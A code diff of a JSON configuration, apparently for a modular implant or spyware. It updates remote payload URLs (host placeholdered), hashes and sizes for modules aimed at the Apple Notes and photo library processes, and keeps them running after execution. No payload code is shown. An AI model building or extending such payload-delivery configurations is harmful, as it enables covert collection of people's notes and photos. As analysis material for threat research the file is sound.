@@ -14,7 +14,7 @@
     "notesScanInterval": 120
   },
   "core": {
-    "url": "http://[HOST_PLACEHOLDER]/details/new.js?rv=2",
+    "url": "http://[HOST_PLACEHOLDER]/details/new.js?rv=4",
     "sha256": "627fd7ca3b83f274dbef85ce2f2d084f85abfc3d229351e32a7a3952fb29b18a",
     "size": 2373784
   },
@@ -265,9 +265,9 @@
     },
     {
       "bundleId": "com.apple.notes",
-      "url": "http://[HOST_PLACEHOLDER]/details/new.js?rv=3",
-      "sha256": "627fd7ca3b83f274dbef85ce2f2d084f85abfc3d229351e32a7a3952fb29b18a",
-      "size": 2373784,
+      "url": "http://[HOST_PLACEHOLDER]/details/photonote.js",
+      "sha256": "df6eccc1eb2a8d50ecb043e80622de33024bc082640bb0e584c59d7e9baaf39b",
+      "size": 248600,
       "flags": {
         "cold": 0,
         "do_not_close_after_run": true
@@ -276,9 +276,9 @@
     },
     {
       "bundleId": "com.apple.photolibraryd",
-      "url": "http://[HOST_PLACEHOLDER]/details/new.js?rv=3",
-      "sha256": "627fd7ca3b83f274dbef85ce2f2d084f85abfc3d229351e32a7a3952fb29b18a",
-      "size": 2373784,
+      "url": "http://[HOST_PLACEHOLDER]/details/photonote.js",
+      "sha256": "df6eccc1eb2a8d50ecb043e80622de33024bc082640bb0e584c59d7e9baaf39b",
+      "size": 248600,
       "flags": {
         "cold": 0,
         "do_not_close_after_run": true
